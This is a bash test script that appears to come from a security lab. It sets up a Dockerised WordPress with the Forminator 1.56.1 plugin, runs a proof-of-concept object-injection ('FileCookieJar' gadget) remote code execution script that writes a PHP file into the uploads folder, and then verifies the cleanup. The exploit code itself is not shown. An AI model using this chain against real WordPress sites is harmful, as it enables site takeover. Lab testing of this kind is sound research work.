#!/usr/bin/env bash
set -euo pipefail
# shellcheck source=tests/common.sh
source "$(dirname -- "$0")/common.sh"

assert_forminator_version 1.56.1
MARKER="RS_GADGET_DOCKER_$(date +%s)_$$"
FORM_ID=''
PAGE_ID=''
TARGET="/var/www/html/wp-content/uploads/forminator-gadget-$MARKER.php"
PUBLIC_PATH="/wp-content/uploads/forminator-gadget-$MARKER.php"

cleanup() {
  if [[ "$TARGET" == /var/www/html/wp-content/uploads/forminator-gadget-RS_GADGET_DOCKER_*.php ]]; then
    dc exec -T wordpress rm -f -- "$TARGET" >/dev/null 2>&1 || true
  fi
  if [[ -n "$FORM_ID" ]]; then
    db_query "DELETE m FROM wp_frmt_form_entry_meta m JOIN wp_frmt_form_entry e ON e.entry_id=m.entry_id WHERE e.form_id=${FORM_ID}; DELETE FROM wp_frmt_form_entry WHERE form_id=${FORM_ID};" >/dev/null || true
  fi
  cleanup_posts "$FORM_ID $PAGE_ID"
}
trap cleanup EXIT

SETUP=$(dc exec -T -u www-data -e LAB_MARKER="$MARKER" wordpress \
  wp --path=/var/www/html eval-file /opt/forminator-lab/oi.php)
FORM_ID=$(printf '%s' "$SETUP" | json_value form_id)
PAGE_ID=$(printf '%s' "$SETUP" | json_value page_id)

python3 "$ROOT/poc_oi_gadget_filecookiejar_rce.py" \
  --url "$BASE_URL" \
  --form-id "$FORM_ID" \
  --file "$TARGET" \
  --public-path "$PUBLIC_PATH" \
  --marker "$MARKER" \
  --admin 'labadmin:labpass' \
  --labkey 'forminator-lab-only'

ROWS=$(db_query "SELECT COUNT(*) FROM wp_frmt_form_entry_meta m JOIN wp_frmt_form_entry e ON e.entry_id=m.entry_id WHERE e.form_id=${FORM_ID} AND m.meta_key='form_uid' AND m.meta_value LIKE '%${MARKER}%';")
[[ "$ROWS" == 0 ]] || { printf '[oi-rce] FAIL: marker rows remain: %s\n' "$ROWS" >&2; exit 1; }
if dc exec -T wordpress test -e "$TARGET"; then
  printf '[oi-rce] FAIL: marker file remains after proof\n' >&2
  exit 1
fi

printf 'RS_OK %s — bundled FileCookieJar chain executed marker command over HTTP and removed file/marker rows\n' "$MARKER"
